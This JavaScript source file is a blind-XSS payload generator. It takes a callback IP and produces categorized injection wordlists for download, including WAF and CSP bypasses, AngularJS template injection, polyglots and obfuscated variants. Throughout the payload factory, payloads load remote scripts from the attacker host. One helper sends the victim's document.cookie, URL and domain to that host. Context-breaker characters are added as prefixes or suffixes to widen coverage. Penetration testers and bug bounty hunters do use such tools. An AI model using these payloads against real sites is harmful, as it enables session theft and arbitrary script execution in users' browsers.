// ── Types and Config ────────────────────────────────────────────────────────
const ALL_CATEGORIES = ['basic','event','bypass','waf','csp','polyglot','angular','dom','obfuscated'];
const CATEGORY_INFO = {
  basic:      { label: 'Basic',      icon: '🎯', desc: 'Script, img, svg, iframe...' },
  event:      { label: 'Event',      icon: '⚡', desc: 'onload, onerror, onmouseover...' },
  bypass:     { label: 'Bypass',     icon: '🔓', desc: 'Case, quotes, encoding...' },
  waf:        { label: 'WAF',        icon: '🛡️', desc: 'Cloudflare, Akamai, Incapsula...' },
  csp:        { label: 'CSP',        icon: '🔒', desc: 'Content Security Policy bypass' },
  polyglot:   { label: 'Polyglot',   icon: '🧬', desc: 'Multi-context payloads' },
  angular:    { label: 'Angular',    icon: '🅰️', desc: 'AngularJS/CSTI injections' },
  dom:        { label: 'DOM',        icon: '🌐', desc: 'DOM-based XSS' },
  obfuscated: { label: 'Obfuscated', icon: '🔮', desc: 'Base64, unicode, XOR...' }
};

const BASE_BREAKERS = [
  { id: 'dquote',     char: '"',    label: '"',    description: 'Double quote' },
  { id: 'squote',     char: "'",    label: "'",    description: 'Single quote' },
  { id: 'backtick',   char: '`',    label: '`',    description: 'Backtick' },
  { id: 'gt',         char: '>',    label: '>',    description: 'Greater than' },
  { id: 'lt',         char: '<',    label: '<',    description: 'Less than' },
  { id: 'slash',      char: '/',    label: '/',    description: 'Slash' },
  { id: 'semicolon',  char: ';',    label: ';',    description: 'Semicolon' },
  { id: 'rparen',     char: ')',    label: ')',     description: 'Parenthèse fermante' },
  { id: 'rbrace',     char: '}',    label: '}',    description: 'Accolade fermante' },
  { id: 'rbracket',   char: ']',    label: ']',    description: 'Crochet fermant' },
  { id: 'slashslash', char: '//',   label: '//',   description: 'Commentaire ligne JS' },
  { id: 'slashstar',  char: '/*',   label: '/*',   description: 'Commentaire bloc JS ouvert' },
  { id: 'starslash',  char: '*/',   label: '*/',   description: 'Commentaire bloc JS fermé' },
  { id: 'colon',      char: ':',    label: ':',    description: 'Colon' },
  { id: 'question',   char: '?',    label: '?',    description: 'Point d\'interrogation' },
  { id: 'hash',       char: '#',    label: '#',    description: 'Hash' },
  { id: 'ampersand',  char: '&',    label: '&',    description: 'Ampersand' },
  { id: 'equals',     char: '=',    label: '=',    description: 'Equals' },
  { id: 'closescript',char: '</script>',  label: '</script>',  description: 'Fermer un tag script existant' },
  { id: 'closestyle', char: '</style>',   label: '</style>',   description: 'Fermer un tag style existant' },
  { id: 'closetitle', char: '</title>',   label: '</title>',   description: 'Fermer un tag title existant' },
  { id: 'closetextarea', char: '</textarea>', label: '</textarea>', description: 'Fermer un tag textarea existant' },
  { id: 'newline',    char: '\n',   label: '\\n',  description: 'Newline' },
  { id: 'crlf',       char: '\r\n', label: '\\r\\n', description: 'CRLF' }
];

// ── State ──────────────────────────────────────────────────────────────────
let state = {
  ip: 'http://YOUR_IP_HERE',
  selectedCategories: [...ALL_CATEGORIES],
  selectedBreakers: [],
  breakerMode: 'prefix',
  includeComments: true,
  searchFilter: '',
  expandedCat: null,
  showPreview: false,
  customBreakers: [],
  allPayloadsCache: {},
  finalPayloads: [],
  filteredPayloads: []
};

// ── Helpers ──────────────────────────────────────────────────────────────────
const b64Encode = str => btoa(unescape(encodeURIComponent(str)));
const makeCallback = (ip, pid) => `${ip}/${pid}`;
function scriptLoader(ip, pid) { const cb = makeCallback(ip, pid); return `var s=document.createElement('script');s.src='${cb}';document.body.appendChild(s);`; }
function imgBeacon(ip, pid) { const cb = makeCallback(ip, pid); return `new Image().src='${cb}';`; }
function fullDataExfil(ip, pid) { const cb = makeCallback(ip, pid); return `var d=document;fetch('${cb}?c='+encodeURIComponent(d.cookie)+'&u='+encodeURIComponent(d.URL)+'&o='+encodeURIComponent(d.domain));`; }

// ── Payload Factory ──────────────────────────────────────────────────────────────────
function buildPayloads(ip) {
  const cats = { basic:[], event:[], bypass:[], waf:[], csp:[], polyglot:[], angular:[], dom:[], obfuscated:[] };
  
  // BASIC
  cats.basic.push({ pid: 'BAS-001', payload: `<script src='${makeCallback(ip, 'BAS-001')}'></script>`, description: 'Basic <script> tag avec src callback', category: 'basic' });
  cats.basic.push({ pid: 'BAS-002', payload: `<script>${scriptLoader(ip, 'BAS-002')}</script>`, description: 'Basic <script> inline avec script loader', category: 'basic' });
  cats.basic.push({ pid: 'BAS-003', payload: `<img src=x onerror="${scriptLoader(ip, 'BAS-003')}">`, description: 'img onerror avec script loader', category: 'basic' });
  cats.basic.push({ pid: 'BAS-004', payload: `<svg onload="${scriptLoader(ip, 'BAS-004')}">`, description: 'svg onload avec script loader', category: 'basic' });
  cats.basic.push({ pid: 'BAS-005', payload: `<body onload="${scriptLoader(ip, 'BAS-005')}">`, description: 'body onload avec script loader', category: 'basic' });
  cats.basic.push({ pid: 'BAS-006', payload: `<iframe onload="${scriptLoader(ip, 'BAS-006')}">`, description: 'iframe onload', category: 'basic' });
  cats.basic.push({ pid: 'BAS-007', payload: `<input autofocus onfocus="${scriptLoader(ip, 'BAS-007')}">`, description: 'input autofocus + onfocus', category: 'basic' });
  cats.basic.push({ pid: 'BAS-008', payload: `<details open ontoggle="${scriptLoader(ip, 'BAS-008')}">`, description: 'details ontoggle', category: 'basic' });
  cats.basic.push({ pid: 'BAS-009', payload: `<marquee onstart="${scriptLoader(ip, 'BAS-009')}">`, description: 'marquee onstart', category: 'basic' });
  cats.basic.push({ pid: 'BAS-010', payload: `<video src=x onerror="${scriptLoader(ip, 'BAS-010')}">`, description: 'video onerror', category: 'basic' });
  cats.basic.push({ pid: 'BAS-011', payload: `<audio src=x onerror="${scriptLoader(ip, 'BAS-011')}">`, description: 'audio onerror', category: 'basic' });
  cats.basic.push({ pid: 'BAS-012', payload: `<script>${fullDataExfil(ip, 'BAS-012')}</script>`, description: 'Exfiltration', category: 'basic' });
  cats.basic.push({ pid: 'BAS-013', payload: `javascript:${scriptLoader(ip, 'BAS-013')}`, description: 'javascript: URI', category: 'basic' });
  cats.basic.push({ pid: 'BAS-014', payload: `<object data='javascript:${imgBeacon(ip, 'BAS-014')}'>`, description: 'object data js URI', category: 'basic' });

  // EVENT
  const evts = [
    ['EVT-001', '<body', 'onpageshow'], ['EVT-002', '<body', 'onhashchange'], ['EVT-003', '<svg', 'onanimationstart'],
    ['EVT-004', '<svg', 'onanimationend'], ['EVT-005', '<form', 'oninput'], ['EVT-006', '<select', 'onchange'],
    ['EVT-007', '<textarea', 'onfocus'], ['EVT-008', '<video', 'oncanplay'], ['EVT-009', '<track', 'onerror'],
    ['EVT-010', '<object', 'onafterscriptexecute'], ['EVT-011', '<object', 'onbeforescriptexecute'],
    ['EVT-012', '<div', 'onmouseover'], ['EVT-013', "<a href='#'", 'onmousedown'], ['EVT-014', '<button', 'onclick']
  ];
  for (const [p, tag, evt] of evts) cats.event.push({ pid: p, payload: `${tag} ${evt}="${scriptLoader(ip, p)}">`, description: `${tag} ${evt}`, category: 'event' });

  // BYPASS
  cats.bypass.push({ pid: 'BYP-001', payload: `<sCrIpT sRc='${makeCallback(ip, 'BYP-001')}'></ScRiPt>`, description: 'Bypass case sensitive', category: 'bypass' });
  cats.bypass.push({ pid: 'BYP-002', payload: `<script x src='${makeCallback(ip, 'BYP-002')}'></script>`, description: 'Bypass tag blacklist', category: 'bypass' });
  cats.bypass.push({ pid: 'BYP-003', payload: `<img src='1' onerror='${scriptLoader(ip, 'BYP-003')}' <`, description: 'Bypass incomplete tag', category: 'bypass' });
  cats.bypass.push({ pid: 'BYP-004', payload: `<script>window['fetch']('${makeCallback(ip, 'BYP-004')}')</script>`, description: 'Bypass dot filter', category: 'bypass' });
  cats.bypass.push({ pid: 'BYP-005', payload: `<svg onload=fetch\`${makeCallback(ip, 'BYP-005')}\`>`, description: 'Template literals', category: 'bypass' });
  
  // WAF
  cats.waf.push({ pid: 'WAF-001', payload: `<svg/onrandom=random onload=${imgBeacon(ip, 'WAF-001')}>`, description: 'CF Bypass', category: 'waf' });
  cats.waf.push({ pid: 'WAF-002', payload: `<svg/OnLoad="\`\${${imgBeacon(ip, 'WAF-002')}}\`">`, description: 'CF Bypass Tpl', category: 'waf' });

  // CSP
  cats.csp.push({ pid: 'CSP-001', payload: `<script/src=//google.com/complete/search?client=chrome%26jsonp=${imgBeacon(ip, 'CSP-001')}>`, description: 'JSONP bypass', category: 'csp' });

  // DOM, POLYGLOT, ANGULAR, OBFUSCATED
  cats.dom.push({ pid: 'DOM-001', payload: `#<script src='${makeCallback(ip, 'DOM-001')}'></script>`, description: 'Hash script', category: 'dom' });
  cats.polyglot.push({ pid: 'POL-001', payload: `jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */oNcliCk=${imgBeacon(ip, 'POL-001')} )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csvg/<svg/oNloAd=${imgBeacon(ip, 'POL-001')}//>/\\x3e`, description: 'Polyglot 0xsobky style', category: 'polyglot' });
  cats.angular.push({ pid: 'ANG-001', payload: `{{constructor.constructor("var _=document.createElement('script');_.src='${makeCallback(ip, 'ANG-001')}';document.getElementsByTagName('body')[0].appendChild(_)")()}}`, description: 'Angular CSTI 1.0.1+', category: 'angular' });
  
  let obf1 = makeCallback(ip, 'OBF-001');
  cats.obfuscated.push({ pid: 'OBF-001', payload: `<script>\\u0076\\u0061\\u0072 \\u0073=...\\u0073.\\u0073\\u0072\\u0063='${obf1}';\\u0064\\u006F\\u0063\\u0075\\u006D\\u0065\\u006E\\u0074...;</script>`, description: 'Unicode escape', category: 'obfuscated' });

  return cats;
}

// ── Update Logic ─────────────────────────────────────────────────────────────
function updateEngine() {
  state.allPayloadsCache = buildPayloads(state.ip);
  const allBreakers = [...BASE_BREAKERS, ...state.customBreakers];
  
  // Selection
  let basePayloads = [];
  state.selectedCategories.forEach(cat => {
    if (state.allPayloadsCache[cat]) basePayloads.push(...state.allPayloadsCache[cat]);
  });

  // Breakers
  let withBreakers = [];
  if (state.selectedBreakers.length === 0) {
    withBreakers = [...basePayloads];
  } else {
    const chars = state.selectedBreakers.map(id => allBreakers.find(b => b.id === id)).filter(Boolean);
    withBreakers.push(...basePayloads);

    if (state.breakerMode === 'combo') {
      const combined = chars.map(b => b.char).join('');
      basePayloads.forEach(p => withBreakers.push({
        ...p, pid: p.pid + '-CMB', payload: combined + p.payload, description: p.description + ` [combo]`
      }));
    } else {
      chars.forEach(breaker => {
        basePayloads.forEach(p => {
          if (state.breakerMode === 'prefix' || state.breakerMode === 'both') {
            withBreakers.push({...p, pid: p.pid + '-P' + breaker.id.substring(0,3).toUpperCase(), payload: breaker.char + p.payload, description: p.description + ` [pref: ${breaker.label}]` });
          }
          if (state.breakerMode === 'suffix' || state.breakerMode === 'both') {
            withBreakers.push({...p, pid: p.pid + '-S' + breaker.id.substring(0,3).toUpperCase(), payload: p.payload + breaker.char, description: p.description + ` [suf: ${breaker.label}]` });
          }
        });
      });
    }
  }

  state.finalPayloads = withBreakers;
  
  // Filtering
  if (!state.searchFilter) {
    state.filteredPayloads = state.finalPayloads;
  } else {
    const term = state.searchFilter.toLowerCase();
    state.filteredPayloads = state.finalPayloads.filter(p => 
      p.pid.toLowerCase().includes(term) || p.description.toLowerCase().includes(term) || p.payload.toLowerCase().includes(term)
    );
  }

  render();
}

function wordlistContent() {
  const lines = [];
  if (state.includeComments) {
    lines.push(`# BLIND XSS WORDLIST`, `# Callback IP : ${state.ip}`, `# Total : ${state.finalPayloads.length}`, ``);
  }
  let currentCat = '';
  state.finalPayloads.forEach(p => {
    if (state.includeComments && p.category !== currentCat) {
       currentCat = p.category;
       lines.push(`\n# === CATEGORY: ${currentCat.toUpperCase()} ===\n`);
    }
    if (state.includeComments) lines.push(`# [${p.pid}] ${p.description}`);
    lines.push(p.payload);
  });
  return lines.join('\\n');
}

// ── DOM & Render ─────────────────────────────────────────────────────────────
function render() {
  const S = (id) => document.getElementById(id);

  // Stats
  S('footer-count').innerText = state.finalPayloads.length;
  S('stats-container').innerHTML = `
    <div class="bg-gray-900/60 border border-gray-800 rounded-lg px-4 py-3"><p class="text-xs text-gray-500">Total Payloads</p><p class="text-2xl font-bold text-red-400">${state.finalPayloads.length}</p></div>
    <div class="bg-gray-900/60 border border-gray-800 rounded-lg px-4 py-3"><p class="text-xs text-gray-500">Payloads Originaux</p><p class="text-2xl font-bold text-blue-400">${state.finalPayloads.filter(p => !p.pid.includes('-P') && !p.pid.includes('-S') && !p.pid.includes('-CMB')).length}</p></div>
    <div class="bg-gray-900/60 border border-gray-800 rounded-lg px-4 py-3"><p class="text-xs text-gray-500">Avec Context Breakers</p><p class="text-2xl font-bold text-orange-400">${state.finalPayloads.filter(p => p.pid.includes('-P') || p.pid.includes('-S') || p.pid.includes('-CMB')).length}</p></div>
    <div class="bg-gray-900/60 border border-gray-800 rounded-lg px-4 py-3"><p class="text-xs text-gray-500">Catégories</p><p class="text-2xl font-bold text-green-400">${state.selectedCategories.length}</p></div>
  `;

  // Modes
  S('breaker-modes').innerHTML = ['prefix', 'suffix', 'both', 'combo'].map(m => 
    `<button data-mode="${m}" class="mode-btn text-xs px-2 py-1.5 rounded transition-colors ${state.breakerMode===m ? 'bg-orange-600 text-white' : 'bg-gray-800 text-gray-400 hover:bg-gray-700'}">${m.toUpperCase()}</button>`
  ).join('');

  document.querySelectorAll('.mode-btn').forEach(btn => btn.onclick = (e) => { state.breakerMode = e.target.dataset.mode; updateEngine(); });

  // Categories
  S('categories-container').innerHTML = ALL_CATEGORIES.map(cat => {
    const sel = state.selectedCategories.includes(cat);
    const count = (state.allPayloadsCache[cat]||[]).length;
    return `<button class="w-full flex items-center gap-2 px-3 py-2 rounded-lg text-left text-sm transition-all ${sel ? 'bg-red-900/30 border border-red-800/50 text-gray-100' : 'bg-gray-900/50 border border-gray-800/50 text-gray-500'}" data-cat="${cat}">
      <span class="text-base">${CATEGORY_INFO[cat].icon}</span> <span class="flex-1 font-medium">${CATEGORY_INFO[cat].label}</span>
      <span class="text-xs px-1.5 py-0.5 rounded ${sel?'bg-red-900/50 text-red-300':'bg-gray-800 text-gray-600'}">${count}</span>
      <div class="w-3 h-3 rounded-sm border flex justify-center items-center ${sel?'bg-red-500 border-red-500':'border-gray-600'}">${sel? '✓' : ''}</div>
    </button>`;
  }).join('');
  S('categories-container').querySelectorAll('button').forEach(b => b.onclick = () => {
    const cat = b.dataset.cat;
    if(state.selectedCategories.includes(cat)) state.selectedCategories = state.selectedCategories.filter(c=>c!==cat);
    else state.selectedCategories.push(cat);
    updateEngine();
  });

  // Breakers
  const allBrks = [...BASE_BREAKERS, ...state.customBreakers];
  S('breakers-container').innerHTML = allBrks.map(b => {
    const sel = state.selectedBreakers.includes(b.id);
    const custom = b.id.startsWith('cust-');
    return `<div class="relative group">
      <button class="px-2 py-1 rounded text-xs font-mono transition-all ${sel ? 'bg-orange-600/80 text-white border border-orange-500' : 'bg-gray-800 text-gray-400 border border-gray-700'} ${custom?'pr-5':''}" data-bid="${b.id}" title="${b.description}">${b.label}</button>
      ${custom ? `<button data-del="${b.id}" class="absolute -top-1 -right-1 w-3.5 h-3.5 bg-red-600 rounded-full text-white text-[8px] flex items-center justify-center opacity-0 group-hover:opacity-100">✕</button>` : ''}
    </div>`;
  }).join('');
  S('breakers-container').querySelectorAll('button[data-bid]').forEach(b => b.onclick = () => {
    const id = b.dataset.bid;
    if(state.selectedBreakers.includes(id)) state.selectedBreakers = state.selectedBreakers.filter(x=>x!==id);
    else state.selectedBreakers.push(id);
    updateEngine();
  });
  S('breakers-container').querySelectorAll('button[data-del]').forEach(b => b.onclick = (e) => {
    e.stopPropagation();
    state.customBreakers = state.customBreakers.filter(x=>x.id!==b.dataset.del);
    state.selectedBreakers = state.selectedBreakers.filter(x=>x!==b.dataset.del);
    updateEngine();
  });

  // Payloads list (right col)
  S('payloads-list').innerHTML = ALL_CATEGORIES.map(cat => {
    if(!state.selectedCategories.includes(cat)) return '';
    const pays = state.filteredPayloads.filter(p=>p.category===cat);
    if(pays.length===0) return '';
    const exp = state.expandedCat === cat;
    return `
      <div class="bg-gray-900/40 border border-gray-800 rounded-lg overflow-hidden">
        <button class="w-full flex items-center gap-3 px-4 py-3 hover:bg-gray-800/30 transition-colors" data-exp="${cat}">
          <span class="text-xl">${CATEGORY_INFO[cat].icon}</span>
          <div class="flex-1 text-left"><span class="text-sm font-semibold text-gray-200">${CATEGORY_INFO[cat].label}</span><span class="text-xs text-gray-500 ml-2">${CATEGORY_INFO[cat].desc}</span></div>
          <span class="text-xs px-2 py-0.5 bg-red-900/40 text-red-400 rounded">${pays.length}</span>
          <span class="text-gray-500 transition-transform ${exp?'rotate-180':''}">▼</span>
        </button>
        ${exp ? `<div class="border-t border-gray-800 max-h-[600px] overflow-auto">` + pays.map(p => `
          <div class="flex gap-2 px-4 py-2.5 border-b border-gray-800/50 hover:bg-gray-800/20 group">
            <div class="flex-1 min-w-0">
              <div class="flex items-center gap-2 mb-1">
                <span class="text-[10px] font-mono px-1.5 py-0.5 bg-red-900/40 text-red-400 rounded">${p.pid}</span>
                <span class="text-xs text-gray-500 truncate">${p.description}</span>
              </div>
              <pre class="text-xs font-mono text-green-400/80 whitespace-pre-wrap break-all leading-relaxed">${p.payload.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</pre>
            </div>
          </div>
        `).join('') + `</div>` : ''}
      </div>
    `
  }).join('');
  document.querySelectorAll('button[data-exp]').forEach(b => b.onclick = () => {
    state.expandedCat = state.expandedCat === b.dataset.exp ? null : b.dataset.exp;
    render();
  });

  // Raw preview
  if (state.showPreview) {
    S('raw-preview').classList.remove('hidden');
    S('raw-content').innerHTML = wordlistContent().replace(/</g, '&lt;').replace(/>/g, '&gt;');
  } else {
    S('raw-preview').classList.add('hidden');
  }
}

// ── Init & Event Listeners ─────────────────────────────────────────────────────────────
document.addEventListener('DOMContentLoaded', () => {
  const S = (id) => document.getElementById(id);
  
  S('ip-input').oninput = e => { state.ip = e.target.value; updateEngine(); };
  S('search-input').oninput = e => { state.searchFilter = e.target.value; updateEngine(); };
  S('chk-comments').onchange = e => { state.includeComments = e.target.checked; render(); };
  
  S('btn-cat-all').onclick = () => { state.selectedCategories = [...ALL_CATEGORIES]; updateEngine(); };
  S('btn-cat-none').onclick = () => { state.selectedCategories = []; updateEngine(); };
  S('btn-breaker-all').onclick = () => { state.selectedBreakers = [...BASE_BREAKERS, ...state.customBreakers].map(b=>b.id); updateEngine(); };
  S('btn-breaker-none').onclick = () => { state.selectedBreakers = []; updateEngine(); };

  S('btn-preview').onclick = () => { state.showPreview = !state.showPreview; render(); };
  
  S('btn-copy-all').onclick = () => {
    navigator.clipboard.writeText(wordlistContent());
    S('copy-text').innerText = 'Copied!';
    setTimeout(() => S('copy-text').innerText = 'Copier tout', 2000);
  };
  S('btn-download').onclick = () => {
    const blob = new Blob([wordlistContent()], {type: 'text/plain'});
    const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download='blind_xss.txt'; a.click();
  };

  S('btn-add-breaker').onclick = () => {
    const val = S('custom-breaker-input').value.trim();
    if(val) {
      const id = 'cust-'+Date.now();
      state.customBreakers.push({id, char:val, label:val, description:'Custom: '+val});
      state.selectedBreakers.push(id);
      S('custom-breaker-input').value = '';
      updateEngine();
    }
  };

  document.querySelectorAll('.toggle-btn').forEach(btn => {
    btn.onclick = () => {
      const content = btn.nextElementSibling;
      const ind = btn.querySelector('.indicator');
      content.classList.toggle('hidden');
      ind.classList.toggle('rotate-180');
    }
  });

  document.querySelectorAll('.code-block').forEach(cb => {
    cb.onclick = () => {
      navigator.clipboard.writeText(cb.dataset.code);
      const tt = cb.querySelector('span');
      const old = tt.innerText;
      tt.innerText = 'COPIÉ!';
      setTimeout(()=> tt.innerText = old, 1000);
    }
  });

  updateEngine();
});
